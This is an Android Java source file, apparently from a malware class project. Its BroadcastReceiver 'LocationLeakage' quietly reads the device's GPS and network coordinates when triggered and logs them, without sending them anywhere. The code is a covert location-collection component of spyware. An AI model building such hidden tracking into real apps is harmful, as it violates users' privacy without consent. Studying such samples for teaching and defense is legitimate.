package com.malwareclass.malwareproject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.util.Log;

import java.io.IOException;
import java.util.List;

import static android.content.Context.LOCATION_SERVICE;


public class LocationLeakage extends BroadcastReceiver {

    private static final String TAG = "LOCATION";
    private double altitude = 0.0;
    private double longitude = 0.0;
    private double latitude = 0.0;


    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Started");

        AppLocationService appLocationService = new AppLocationService(context);
        Location GPSlocation = appLocationService.getLocation(LocationManager.GPS_PROVIDER);
        if(GPSlocation != null){
            latitude = GPSlocation.getLatitude();
            longitude = GPSlocation.getLongitude();
            altitude = GPSlocation.getAltitude();
        }
        Location NWKlocation = appLocationService.getLocation(LocationManager.NETWORK_PROVIDER);
        if(NWKlocation != null){
            latitude = NWKlocation.getLatitude();
            longitude = NWKlocation.getLongitude();
            altitude = NWKlocation.getAltitude();
        }

        Log.d(TAG, "latitude " + Double.toString(latitude) + " longitude " + Double.toString(longitude) + " altitude " + Double.toString(altitude));
        Log.d(TAG, "Ended");
    }

}
